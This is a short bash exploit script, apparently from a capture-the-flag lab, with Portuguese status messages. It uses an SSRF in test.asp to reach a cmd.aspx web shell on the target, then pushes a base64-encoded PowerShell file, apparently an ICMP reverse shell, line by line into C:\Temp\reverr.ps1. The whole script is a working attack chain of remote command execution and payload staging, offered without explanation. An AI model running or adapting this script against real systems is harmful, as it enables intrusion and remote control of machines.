#!/bin/bash

function def_handler(){
	echo -e "\n\n[!]Saindo...\n\n"
	exit 1
}

# Ctrl + C
trap def_handler INT

# Variable_Global
main_url="http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx"

counter=0

for line in $(cat icmp.ps1.b64); do
	command="echo $line >> C:\Temp\reverr.ps1"
	echo -ne "[+] Total de linhas enviadas [$counter/87]"
	curl -s -X GET -G $main_url --data-urlencode "xcmd=$command" &>/dev/null
	let counter+=1
done
